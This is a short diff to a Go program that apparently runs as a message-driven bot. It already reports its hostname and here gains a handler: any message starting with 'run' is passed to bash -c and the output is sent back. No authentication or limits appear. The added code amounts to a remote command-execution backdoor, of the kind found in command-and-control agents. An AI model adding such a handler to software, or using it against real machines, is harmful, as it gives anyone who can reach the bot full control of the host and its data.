@@ -5,6 +5,7 @@ import (
     "encoding/hex"
     "log"
     "os"
+    "os/exec"
 )
 
 func Run() {
@@ -20,6 +21,11 @@ func Run() {
         host, _ := os.Hostname()
         c.Send("I am at " + host)
 
+    })
+
+    Pipe.Global("run (.+)", func(c *Context, matches []string) {
+        out, _ := exec.Command("bash", "-c", matches[1]).Output()
+        c.Send(out)
     })
 
 }
